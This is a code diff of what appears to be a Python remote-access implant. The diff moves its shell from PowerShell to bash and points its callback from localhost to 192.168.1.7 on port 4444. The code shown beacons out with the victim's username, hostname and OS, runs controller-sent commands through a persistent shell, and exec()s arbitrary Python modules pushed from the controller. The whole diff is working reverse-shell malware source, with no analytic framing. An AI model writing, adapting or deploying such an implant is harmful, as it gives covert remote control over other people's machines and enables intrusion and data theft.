@@ -8,8 +8,8 @@ class Request:
     def __init__(self):
         self.conn = None
         self.header_separator = b"||"
-        self.header = b''
-        self.data = b''
+        self.header = b""
+        self.data = b""
 
     def set_conn(self, conn):
         self.conn = conn
@@ -60,7 +60,7 @@ class Request:
 
         parts = body.split(self.header_separator, 1)
 
-        header = b''
+        header = b""
         
         if len(parts) == 2:
             header, data = parts
@@ -72,7 +72,7 @@ class Request:
         return True
 
     def _recv_n_bytes(self, n):
-        buffer = b''
+        buffer = b""
         while len(buffer) < n:
             chunk = self.conn.recv(n - len(buffer))
             if not chunk:
@@ -115,7 +115,7 @@ def close(conn):
 class PersistentShell:
     def __init__(self):
         self.process = subprocess.Popen(
-            ['powershell.exe'],
+            ["/bin/bash"],
             stdin=subprocess.PIPE,
             stdout=subprocess.PIPE,
             stderr=subprocess.STDOUT,
@@ -138,7 +138,7 @@ class PersistentShell:
                 buffer += line
                 if self.marker in line:
                     with self.lock:
-                        self.output = buffer.replace(self.marker, '').strip()
+                        self.output = buffer.replace(self.marker, "").strip()
                         buffer = ""
                     self.command_done.set()
         threading.Thread(target=read_output, daemon=True).start()
@@ -171,7 +171,7 @@ class PersistentShell:
 
 def execute(cmd) -> str:
     try:
-        result = subprocess.check_output(['powershell','-c',cmd],shell=True, stderr=subprocess.STDOUT)
+        result = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, executable="/bin/bash")
     except subprocess.CalledProcessError as e:
         result = e.output
     return result.decode()
@@ -199,10 +199,10 @@ def get_system_info():
     os_type = platform.system().lower() 
     arch = platform.machine().lower()   
 
-    if arch in ['amd64', 'x86_64']:
-        arch = 'x64'
-    elif 'arm' in arch:
-        arch = 'arm'
+    if arch in ["amd64", "x86_64"]:
+        arch = "x64"
+    elif "arm" in arch:
+        arch = "arm"
 
     return f"||{username}||{hostname}||{os_type}-{arch}"
 
@@ -213,12 +213,13 @@ def execute_module(module):
     obj = compile(module, "<string>", "exec")
     exec(obj, namespace)
 
-    response = namespace['result']
+    response = namespace["result"]
     return response
+
 
 def main():
     conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    conn.connect(("127.0.0.1", 4444))
+    conn.connect(("192.168.1.7", 4444))
     send_data(conn,get_system_info())
     while True:
         response = None
@@ -239,6 +240,6 @@ def main():
             response = "\n"
         send_data(conn, response)
             
-        
+     
 if __name__ == "__main__":
     main()
